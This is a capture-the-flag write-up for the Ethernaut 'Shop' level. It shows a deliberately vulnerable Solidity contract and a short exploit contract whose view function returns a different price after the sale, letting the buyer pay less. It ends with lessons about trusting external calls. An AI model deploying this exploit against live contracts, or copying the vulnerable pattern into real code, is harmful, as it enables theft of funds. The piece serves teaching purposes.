---
description: view function
---

# 21 - Shop

Ethernaut Level21: [Shop](https://ethernaut.openzeppelin.com/level/0xCb1c7A4Dee224bac0B47d0bE7bb334bac235F842)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
```

### Goal of this level

* make `price` cheaper than original price

## Solution

```solidity
contract AttackShop {
    Shop public shopContract;

    function attack(Shop _instance) public {
        shopContract = _instance;
        shopContract.buy();
    }

    function price() external view returns (uint256) {
        return !shopContract.isSold() ? shopContract.price() : shopContract.price() - 100;
    }
}
```

price returns `100` when `isSold` is `false`, and 0 when it's `true`.

Done! 😎

## Key Takeways

* `view` keyword merely means the function does not change state
* this doesn't mean it always returns the same value
* it's unsafe to change the state based on external and untrusted contracts logic
